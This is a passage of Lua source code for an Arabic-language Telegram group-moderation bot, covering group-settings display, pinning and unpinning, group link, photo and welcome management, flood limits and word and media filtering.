if text == 'اعدادات الجروب' and Mod(msg) then    
if database:get(bot_id..'lockpin'..msg.chat_id_) then    
lock_pin = '🔓'
else 
lock_pin = '🔐'    
end
if database:get(bot_id..'lock:tagservr'..msg.chat_id_) then    
lock_tagservr = '🔓'
else 
lock_tagservr = '🔐'    
end
if database:get(bot_id..'lock:text'..msg.chat_id_) then    
lock_text = '🔓'
else 
lock_text = '🔐'    
end
if database:get(bot_id.."lock:AddMempar"..msg.chat_id_) == 'kick' then
lock_add = '🔓'
else 
lock_add = '🔐'    
end    
if database:get(bot_id.."lock:Join"..msg.chat_id_) == 'kick' then
lock_join = '🔓'
else 
lock_join = '🔐'    
end    
if database:get(bot_id..'lock:edit'..msg.chat_id_) then    
lock_edit = '🔓'
else 
lock_edit = '??'    
end
print(welcome)
if database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_) then
welcome = '🔓'
else 
welcome = '🔐'    
end
if database:get(bot_id..'lock:edit'..msg.chat_id_) then    
lock_edit_med = '🔓'
else 
lock_edit_med = '◉'    
end
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_, "flood") == "kick" then     
flood = 'بالطرد'     
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "keed" then     
flood = 'بالتقيد'     
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "mute" then     
flood = 'بالكتم'           
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "del" then     
flood = 'بالمسح'           
else     
flood = '🔐'     
end
if database:get(bot_id.."lock:Photo"..msg.chat_id_) == "del" then
lock_photo = '🔓' 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ked" then 
lock_photo = 'بالتقيد'   
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ktm" then 
lock_photo = 'بالكتم'    
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "kick" then 
lock_photo = 'بالطرد'   
else
lock_photo = '🔐'   
end    
if database:get(bot_id.."lock:Contact"..msg.chat_id_) == "del" then
lock_phon = '🔓' 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ked" then 
lock_phon = 'بالتقيد'    
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ktm" then 
lock_phon = 'بالكتم'    
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "kick" then 
lock_phon = 'بالطرد'    
else
lock_phon = '🔐'    
end    
if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" then
lock_links = '🔓'
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" then
lock_links = 'بالتقيد'    
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ktm" then
lock_links = 'بالكتم'    
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" then
lock_links = 'بالطرد'    
else
lock_links = '🔐'    
end
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" then
lock_cmds = '🔓'
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" then
lock_cmds = 'بالتقيد'    
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" then
lock_cmds = 'بالكتم'   
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" then
lock_cmds = 'بالطرد'    
else
lock_cmds = '🔐'    
end
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" then
lock_user = '🔓'
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" then
lock_user = 'بالتقيد'    
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" then
lock_user = 'بالكتم'    
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" then
lock_user = 'بالطرد'    
else
lock_user = '🔐'    
end
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" then
lock_hash = '🔓'
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" then 
lock_hash = 'بالتقيد'    
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" then 
lock_hash = 'بالكتم'    
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" then 
lock_hash = 'بالطرد'    
else
lock_hash = '🔐'    
end
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
lock_muse = '🔓'
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then 
lock_muse = 'بالتقيد'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then 
lock_muse = 'بالكتم'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then 
lock_muse = 'بالطرد'    
else
lock_muse = '🔐'    
end 
if database:get(bot_id.."lock:Video"..msg.chat_id_) == "del" then
lock_ved = '🔓'
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ked" then 
lock_ved = 'بالتقيد'    
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ktm" then 
lock_ved = 'بالكتم'    
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "kick" then 
lock_ved = 'بالطرد'    
else
lock_ved = '🔐'    
end
if database:get(bot_id.."lock:Animation"..msg.chat_id_) == "del" then
lock_gif = '🔓'
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ked" then 
lock_gif = 'بالتقيد'    
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ktm" then 
lock_gif = 'بالكتم'    
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "kick" then 
lock_gif = 'بالطرد'    
else
lock_gif = '🔐'    
end
if database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "del" then
lock_ste = '🔓'
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ked" then 
lock_ste = 'بالتقيد'    
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ktm" then 
lock_ste = 'بالكتم'    
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "kick" then 
lock_ste = 'بالطرد'    
else
lock_ste = '🔐'    
end
if database:get(bot_id.."lock:geam"..msg.chat_id_) == "del" then
lock_geam = '🔓'
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ked" then 
lock_geam = 'بالتقيد'    
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ktm" then 
lock_geam = 'بالكتم'    
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "kick" then 
lock_geam = 'بالطرد'    
else
lock_geam = '🔐'    
end    
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
lock_vico = '🔓'
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then 
lock_vico = 'بالتقيد'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then 
lock_vico = 'بالكتم'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then 
lock_vico = 'بالطرد'    
else
lock_vico = '🔐'    
end    
if database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "del" then
lock_inlin = '🔓'
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ked" then 
lock_inlin = 'بالتقيد'
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ktm" then 
lock_inlin = 'بالكتم'    
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "kick" then 
lock_inlin = 'بالطرد'
else
lock_inlin = '🔐'
end
if database:get(bot_id.."lock:forward"..msg.chat_id_) == "del" then
lock_fwd = '🔓'
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ked" then 
lock_fwd = 'بالتقيد'    
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ktm" then 
lock_fwd = 'بالكتم'    
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "kick" then 
lock_fwd = 'بالطرد'    
else
lock_fwd = '🔐'    
end    
if database:get(bot_id.."lock:Document"..msg.chat_id_) == "del" then
lock_file = '🔓'
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ked" then 
lock_file = 'بالتقيد'    
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ktm" then 
lock_file = 'بالكتم'    
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "kick" then 
lock_file = 'بالطرد'    
else
lock_file = '🔐'    
end    
if database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "del" then
lock_self = '🔓'
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ked" then 
lock_self = 'بالتقيد'    
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ktm" then 
lock_self = 'بالكتم'    
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "kick" then 
lock_self = 'بالطرد'    
else
lock_self = '🔐'    
end
if database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'del' then
lock_bots = '🔓'
elseif database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'ked' then
lock_bots = 'بالتقيد'   
elseif database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'kick' then
lock_bots = 'بالطرد'    
else
lock_bots = '🔐'    
end
if database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "del" then
lock_mark = '🔓'
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ked" then 
lock_mark = 'بالتقيد'    
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ktm" then 
lock_mark = 'بالكتم'    
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "kick" then 
lock_mark = 'بالطرد'    
else
lock_mark = '🔐'    
end
if database:get(bot_id.."lock:Spam"..msg.chat_id_) == "del" then    
lock_spam = '🔓'
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ked" then 
lock_spam = 'بالتقيد'    
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ktm" then 
lock_spam = 'بالكتم'    
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "kick" then 
lock_spam = 'بالطرد'    
else
lock_spam = '🔐'    
end        
if not database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
rdmder = '🔓'
else
rdmder = '🔐'
end
if not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
rdsudo = '🔓'
else
rdsudo = '🔐'
end
if not database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
idgp = '🔓'
else
idgp = '🔐'
end
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then
idph = '🔓'
else
idph = '🔐'
end
if not database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
setadd = '🔓'
else
setadd = '🔐'
end
if not database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
banm = '🔓'
else
banm = '🔐'
end
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
addme = '🔓'
else
addme = '🔐'
end
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
sehuser = '🔓'
else
sehuser = '🔐'
end
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
kickme = '🔓'
else
kickme = '🔐'
end
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 0
local text = 
'\n𝙶𝚁𝙾𝚄𝙿 𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂'..
'\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ '..
'\n ◉ اعدادات الجروب كتالي ✔↓'..
'\nء╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸'..
'\n ◉  علامة ال {🔓} تعني مفعل'..
'\n ◉  علامة ال {🔐} تعني معطل'..
'\nء╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸'..
'\n ◉  الروابط ← { '..lock_links..
' }\n'..' ◉  المعرفات ← { '..lock_user..
' }\n'..' ◉  التاك ← { '..lock_hash..
' }\n'..' ◉  البوتات ← { '..lock_bots..
' }\n'..' ◉  التوجيه ← { '..lock_fwd..
' }\n'..' ◉  التثبيت ← { '..lock_pin..
' }\n'..' ◉  الاشعارات ← { '..lock_tagservr..
' }\n'..' ◉  الماركدون ← { '..lock_mark..
' }\n'..' ◉  التعديل ← { '..lock_edit..
' }\n'..' ◉  تعديل الميديا ← { '..lock_edit_med..
' }\nء╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸'..
'\n'..' ◉  الكلايش ← { '..lock_spam..
' }\n'..' ◉  الكيبورد ← { '..lock_inlin..
' }\n'..' ◉  الاغاني ← { '..lock_vico..
' }\n'..' ◉  المتحركه ← { '..lock_gif..
' }\n'..' ◉  الملفات ← { '..lock_file..
' }\n'..' ◉  الدردشه ← { '..lock_text..
' }\n'..' ◉   الفيديو ← { '..lock_ved..
' }\n'..' ◉   الصور ← { '..lock_photo..
' }\nء╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸'..
'\n'..' ◉   الصوت ← { '..lock_muse..
' }\n'..' ◉  الملصقات ← { '..lock_ste..
' }\n'..' ◉  الجهات ← { '..lock_phon..
' }\n'..' ◉  الدخول ← { '..lock_join..
' }\n'..' ◉  الاضافه ← { '..lock_add..
' }\n'..' ◉  السيلفي ← { '..lock_self..
' }\n'..' ◉  الالعاب ← { '..lock_geam..
' }\n'..' ◉  التكرار ← { '..flood..
' }\n'..' ◉  الترحيب ← { '..welcome..
' }\n'..' ◉  عدد التكرار ← { '..NUM_MSG_MAX..
' }\nء╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸'..
'\n ◉  علامة ال {🔓} تعني مفعل'..
'\n ◉  علامة ال {🔐} تعني معطل'..
'\nء╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸'..
'\n'..' ◉  امر صيح ← { '..kickme..
' }\n'..' ◉  امر اطردني ← { '..sehuser..
' }\n'..' ◉  امر مين ضافني ← { '..addme..
' }\n'..' ◉  الردود ← { '..rdmder..
' }\n'..' ◉  الردود العامه ← { '..rdsudo..
' }\n'..' ◉  الايدي ← { '..idgp..
' }\n'..' ◉  الايدي بالصوره ← { '..idph..
' }\n'..' ◉  الرفع ← { '..setadd..
' }\n'..' ◉  الحظر ← { '..banm..' }\n\n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n ◉ قناة سورس الفا ↓\n [ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀](t.me/so_alfaa ) \n'
send(msg.chat_id_, msg.id_,text)     
end
if text ==('تثبيت') and msg.reply_to_message_id_ ~= 0 and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," ◉ عذرآ تم قفل التثبيت")  
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," ◉ تم تثبيت الرساله")   
database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.reply_to_message_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," ◉ انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," ◉ لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ◉ ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil) 
end
if text == 'الغاء التثبيت' and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," ◉ عذرآ تم قفل الثبيت")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," ◉ تم الغاء تثبيت الرساله")   
database:del(bot_id..'Pin:Id:Msg'..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," ◉ انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," ◉ لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ◉ ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil)
end
if text == 'الغاء تثبيت الكل' and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," ◉ عذرآ تم قفل الثبيت")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"◉ تم الغاء تثبيت الكل")   
https.request('https://api.telegram.org/bot'..token..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
database:del(bot_id..'Pin:Id:Msg'..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," ◉ انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," ◉ لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ◉ ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil)
end
if text and text:match('^ضع تكرار (%d+)$') and Mod(msg) then   
local Num = text:match('ضع تكرار (.*)')
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"floodmax" ,Num) 
send(msg.chat_id_, msg.id_,' ◉ تم وضع عدد التكرار ('..Num..')')  
end 
if text and text:match('^ضع زمن التكرار (%d+)$') and Mod(msg) then   
local Num = text:match('^ضع زمن التكرار (%d+)$')
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"floodtime" ,Num) 
send(msg.chat_id_, msg.id_,' ◉ تم وضع زمن التكرار ('..Num..')') 
end
if text == "ضع رابط" or text == 'وضع رابط' then
if msg.reply_to_message_id_ == 0  and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_,msg.id_," ◉ حسنآ ارسل اليه الرابط الان")
database:setex(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_,120,true) 
return false
end
end
if text == "تفعيل رابط" or text == 'تفعيل الرابط' then
if Mod(msg) then  
database:set(bot_id.."Link_Group:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," ◉ تم تفعيل الرابط") 
return false  
end
end
if text == "تعطيل رابط" or text == 'تعطيل الرابط' then
if Mod(msg) then  
database:del(bot_id.."Link_Group:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," ◉ تم تعطيل الرابط") 
return false end
end
---------------------

if text == "تفعيل صورتي" or text == 'تفعيل الصوره' then
if Constructor(msg) then  
database:set(bot_id.."my_photo:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," ◉ تم تفعيل الصوره") 
return false  
end
end
if text == "تعطيل الصوره" or text == 'تعطيل صورتي' then
if Constructor(msg) then  
database:del(bot_id.."my_photo:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," ◉ تم تعطيل الصوره") 
return false end
end
if text == "الرابط" then 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or database:get(bot_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local Teext = '◉ '..ta.title_..'\n'..linkgpp.result 
local inline = {{{text = ta.title_, url=linkgpp.result}},
{{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
} 
send_inline_key(msg.chat_id_,Teext,nil,inline,msg.id_/2097152/0.5) 
else 
send(msg.chat_id_, msg.id_,'◉لا يوجد رابط ارسل ضع رابط') 
end 
end,nil) 
end
if text == 'مسح الرابط' or text == 'مسح الرابط' then
if Mod(msg) then     
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_,msg.id_," ◉ تم مسح الرابط")           
database:del(bot_id.."Private:Group:Link"..msg.chat_id_) 
return false      
end
end
if text and text:match("^ضع صوره") and Mod(msg) and msg.reply_to_message_id_ == 0 then  
database:set(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_,true) 
send(msg.chat_id_, msg.id_,' ◉ ارسل لي الصوره') 
return false
end
if text == "مسح الصوره" or text == "مسح الصوره" then 
if Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
https.request('https://api.telegram.org/bot'..token..'/deleteChatPhoto?chat_id='..msg.chat_id_) 
send(msg.chat_id_, msg.id_,' ◉ تم ازالة صورة الجروب') 
end
return false  
end
if text == 'ضع وصف' or text == 'وضع وصف' then  
if Mod(msg) then
database:setex(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_,' ◉ ارسل الان الوصف')
end
return false  
end
if text == 'ضع ترحيب' or text == 'وضع ترحيب' then  
if Mod(msg) then
database:setex(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
t  = ' ◉ ارسل لي الترحيب الان'
tt = '\n ◉ تستطيع اضافة مايلي !\n ◉ دالة عرض الاسم ←{`name`}\n ◉ دالة عرض المعرف ←{`user`}'
send(msg.chat_id_, msg.id_,t..tt) 
end
return false  
end
if text == 'الترحيب' and Mod(msg) then 
local GetWelcomeGroup = database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_)  
if GetWelcomeGroup then 
GetWelcome = GetWelcomeGroup
else 
GetWelcome = ' ◉ لم يتم تعيين ترحيب للجروب'
end 
send(msg.chat_id_, msg.id_,'['..GetWelcome..']') 
return false  
end
if text == 'تفعيل الترحيب' and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id..'Chek:Welcome'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,' ◉ تم تفعيل ترحيب الجروب') 
return false  
end
if text == 'تعطيل الترحيب' and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:del(bot_id..'Chek:Welcome'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل ترحيب الجروب') 
return false  
end
if text == 'مسح الترحيب' or text == 'مسح الترحيب' then 
if Mod(msg) then
database:del(bot_id..'Get:Welcome:Group'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,' ◉ تم ازالة ترحيب الجروب') 
end
end
if text and text == "منع" and msg.reply_to_message_id_ == 0 and Manager(msg)  then       
send(msg.chat_id_, msg.id_," ◉ ارسل الكلمه لمنعها")  
database:set(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ◉ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."DRAGON1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."DRAGON1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ◉ تم منع الكلمه مع التحذير")  
database:del(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."DRAGON1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."DRAGON1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."DRAGON1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ◉ ارسل الكلمه الان")  
database:set(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test and test == "reppp" then   
send(msg.chat_id_, msg.id_," ◉ تم الغاء منعها")  
database:del(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."DRAGON1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."DRAGON1:List:Filter"..msg.chat_id_,text)  
return false  end  
end


if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and Manager(msg) then     
function cb(a,b,c) 
textt = ' ◉ تم منع '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
database:sadd(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
database:sadd(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
database:sadd(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end
if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and Manager(msg) then     
function cb(a,b,c) 
textt = ' ◉ تم الغاء منع '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
database:srem(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
database:srem(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
database:srem(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end

if text == "مسح قائمه المنع"and Manager(msg) then   
local list = database:smembers(bot_id.."DRAGON1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
